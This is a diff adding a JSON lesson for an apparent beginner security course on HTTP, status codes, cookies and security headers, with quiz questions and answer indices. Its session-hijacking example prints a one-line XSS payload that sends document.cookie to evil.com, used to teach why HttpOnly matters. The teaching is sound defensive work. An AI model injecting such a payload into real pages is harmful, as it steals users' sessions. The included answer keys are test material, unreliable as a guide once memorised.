@@ -1,0 +1,154 @@
+{
+  "lesson_id": "41d6229f-aee4-41f4-974c-376a4c9c3561",
+  "lesson_number": "715",
+  "domain": "fundamentals",
+  "title": "HTTP/HTTPS and Web Security Basics",
+  "difficulty": 1,
+  "order_index": 31,
+  "prerequisites": [
+    "Networking Fundamentals: TCP/IP for Security"
+  ],
+  "concepts": [
+    "HTTP methods",
+    "Status codes",
+    "HTTPS/TLS",
+    "Cookies and sessions",
+    "Security headers",
+    "CORS"
+  ],
+  "estimated_time": 45,
+  "learning_objectives": [
+    "Explain HTTP request/response structure and common methods (GET, POST, PUT, DELETE)",
+    "Interpret HTTP status codes relevant to security (401, 403, 200, 500)",
+    "Understand how HTTPS/TLS protects web traffic",
+    "Explain cookies, sessions, and why they matter for attacks",
+    "Identify security headers: CSP, HSTS, X-Frame-Options"
+  ],
+  "post_assessment": [
+    {
+      "question": "What HTTP method should be used to submit sensitive form data (like passwords)?",
+      "options": [
+        "GET",
+        "POST",
+        "PUT",
+        "HEAD"
+      ],
+      "correct_answer": 1,
+      "explanation": "POST sends data in the request body (not URL), so it doesn't appear in browser history, server logs, or referrer headers. GET data appears in the URL.",
+      "type": "multiple_choice",
+      "difficulty": 1,
+      "question_id": "02e76927-43c5-40ca-b705-66d167c90efc"
+    },
+    {
+      "question": "What does HTTP status code 403 mean?",
+      "options": [
+        "Not Found",
+        "Server Error",
+        "Forbidden (authenticated but not authorized)",
+        "Unauthorized (not authenticated)"
+      ],
+      "correct_answer": 2,
+      "explanation": "403 Forbidden means the server understood the request but refuses to authorize it. 401 means authentication required.",
+      "type": "multiple_choice",
+      "difficulty": 1,
+      "question_id": "c539c3b4-3c83-4c8e-921e-e6a3f1b77cee"
+    },
+    {
+      "question": "What does the HSTS security header do?",
+      "options": [
+        "Prevents XSS attacks",
+        "Forces browsers to use HTTPS for future connections",
+        "Blocks clickjacking",
+        "Enables cookie security"
+      ],
+      "correct_answer": 1,
+      "explanation": "HTTP Strict Transport Security (HSTS) tells browsers to always use HTTPS for the domain, preventing SSL stripping attacks.",
+      "type": "multiple_choice",
+      "difficulty": 2,
+      "question_id": "8766c429-3997-413a-9830-c7d3c9693f1f"
+    },
+    {
+      "question": "A cookie with the 'Secure' flag means:",
+      "options": [
+        "The cookie content is encrypted",
+        "The cookie is only sent over HTTPS connections",
+        "The cookie cannot be accessed by JavaScript",
+        "The cookie is signed"
+      ],
+      "correct_answer": 1,
+      "explanation": "The Secure flag tells the browser to only send the cookie over HTTPS, preventing it from being transmitted in cleartext.",
+      "type": "multiple_choice",
+      "difficulty": 2,
+      "question_id": "fc7990f6-d8d1-449c-a841-61237e277843"
+    },
+    {
+      "question": "What is the Same-Origin Policy?",
+      "options": [
+        "Requiring HTTPS for all requests",
+        "Browsers restricting scripts from accessing data from different origins",
+        "Server-side input validation",
+        "Cookie domain restrictions"
+      ],
+      "correct_answer": 1,
+      "explanation": "SOP prevents JavaScript from one origin (domain+protocol+port) from reading data from another origin. CORS is a mechanism to relax SOP selectively.",
+      "type": "multiple_choice",
+      "difficulty": 2,
+      "question_id": "d37e582f-0ecb-4494-849c-9f49abcb200f"
+    }
+  ],
+  "jim_kwik_principles": [
+    "teach_like_im_10",
+    "active_learning",
+    "memory_hooks",
+    "connect_to_what_i_know",
+    "minimum_effective_dose",
+    "multiple_memory_pathways",
+    "learning_sprint",
+    "reframe_limiting_beliefs",
+    "gamify_it",
+    "meta_learning"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "content": "HTTP is the language of the web. Every web attack — XSS, CSRF, SQL injection, clickjacking — happens over HTTP. Understanding it isn't optional. It's the table every web security concept sits on."
+    },
+    {
+      "type": "explanation",
+      "content": "## HTTP: The Web's Language\n\n### Request Structure\n```\nGET /login HTTP/1.1\nHost: example.com\nCookie: session=abc123\nUser-Agent: Mozilla/5.0\n\n[request body for POST]\n```\n\n### Response Structure\n```\nHTTP/1.1 200 OK\nContent-Type: text/html\nSet-Cookie: session=abc123; Secure; HttpOnly\nStrict-Transport-Security: max-age=31536000\n\n[HTML body]\n```\n\n### Key HTTP Methods:\n- **GET** — retrieve data (no body, cached, appears in URLs)\n- **POST** — send data (body, not cached)\n- **PUT/PATCH** — update resource\n- **DELETE** — remove resource\n- **OPTIONS** — CORS preflight check\n\n### Critical Status Codes:\n- 200 OK | 301/302 Redirect | 400 Bad Request\n- 401 Unauthorized | 403 Forbidden | 404 Not Found\n- 500 Server Error (often reveals stack traces!)"
+    },
+    {
+      "type": "explanation",
+      "content": "## Teach Me Like I'm 10\n\nHTTP is like ordering at a restaurant:\n- **You (browser):** 'I'd like the homepage please' → GET /\n- **Waiter (server):** '200 OK, here's your page!'\n- **Or:** '404 — we don't have that dish'\n- **Or:** '403 — you're not allowed in the VIP section'\n\n**Cookies** are like your table number card — the waiter gives you one when you sit down, you show it every time you order so they know it's you.\n\n**Sessions** are the restaurant's internal record — your table number links to your order history in their system.\n\n**HTTPS** = having the conversation in a soundproof booth instead of shouting across the restaurant."
+    },
+    {
+      "type": "code_exercise",
+      "content": "## Hands-On: HTTP Exploration\n\n```bash\n# Inspect HTTP headers with curl\ncurl -I https://example.com\n# Shows: Content-Type, Server, X-Frame-Options, etc.\n\n# See the full request/response\ncurl -v https://example.com 2>&1 | head -50\n\n# Check for security headers\ncurl -s -D - https://google.com -o /dev/null | grep -i 'strict\\|x-frame\\|content-security\\|x-xss'\n\n# Python: manual HTTP request\nimport urllib.request\nreq = urllib.request.Request(\n    'https://httpbin.org/get',\n    headers={'User-Agent': 'SecurityTest/1.0'}\n)\nwith urllib.request.urlopen(req) as response:\n    print(response.status)  # 200\n    print(dict(response.headers))\n```\n\n**Security Headers Checklist:**\n- `Strict-Transport-Security` — force HTTPS\n- `Content-Security-Policy` — restrict resource loading\n- `X-Frame-Options: DENY` — prevent clickjacking\n- `X-Content-Type-Options: nosniff` — prevent MIME sniffing\n- `Set-Cookie: Secure; HttpOnly; SameSite=Strict`\n\nTest your site: https://securityheaders.com"
+    },
+    {
+      "type": "real_world",
+      "content": "## Real-World: Session Hijacking via Cookie Theft\n\nA website sets a session cookie without the `HttpOnly` flag:\n```javascript\n// Attacker injects this XSS payload\ndocument.location = 'https://evil.com/steal?c=' + document.cookie;\n```\n\nWithout `HttpOnly`, JavaScript can read the session cookie → sent to attacker → they log in as the victim.\n\n**Proper cookie configuration:**\n```\nSet-Cookie: sessionid=abc123;\n  Secure;        /* HTTPS only */\n  HttpOnly;      /* No JS access */\n  SameSite=Strict; /* No cross-site requests */\n  Path=/;\n  Max-Age=3600\n```\n\nThis single cookie header, written correctly, blocks cookie theft, CSRF, and network interception simultaneously."
+    },
+    {
+      "type": "memory_aid",
+      "content": "## Memory Hook: Security Header Initials\n\n**SHCX** — the four essential security headers:\n- **S**TS — Strict-Transport-Security (force HTTPS)\n- **H**ttpOnly + Secure cookie flags\n- **C**SP — Content-Security-Policy (prevent XSS)\n- **X**-Frame-Options (prevent clickjacking)\n\n**HTTP status codes in threes:**\n- 2xx = **S**uccess (200 = OK)\n- 3xx = **R**edirect (301 = permanent, 302 = temporary)\n- 4xx = **C**lient error (401 = auth needed, 403 = no access, 404 = not found)\n- 5xx = **S**erver error (500 = crash, 503 = overloaded)"
+    },
+    {
+      "type": "reflection",
+      "content": "## Reflection: Every Web Attack Starts Here\n\nThink about the biggest web vulnerabilities:\n- **XSS** exploits the browser's trust in JavaScript embedded in HTML\n- **CSRF** exploits cookies automatically sent with cross-origin requests\n- **Clickjacking** exploits iframes loading your site inside attacker's page\n- **Man-in-the-middle** exploits HTTP (not HTTPS) traffic\n\nAll of these are HTTP-level attacks. All of them are prevented by proper HTTP configuration.\n\nWhen you next browse a website, open DevTools → Network tab. Watch every request. You'll never see the web the same way again."
+    },
+    {
+      "type": "mindset_coach",
+      "content": "HTTP is 30+ years old and still the backbone of everything. Its simplicity is a feature. Its age is both a gift (well understood) and a curse (decades of accumulated vulnerabilities). Master this, and web security becomes pattern recognition."
+    }
+  ],
+  "tags": [
+    "HTTP",
+    "HTTPS",
+    "web security",
+    "cookies",
+    "sessions",
+    "security headers",
+    "fundamentals"
+  ]
+}
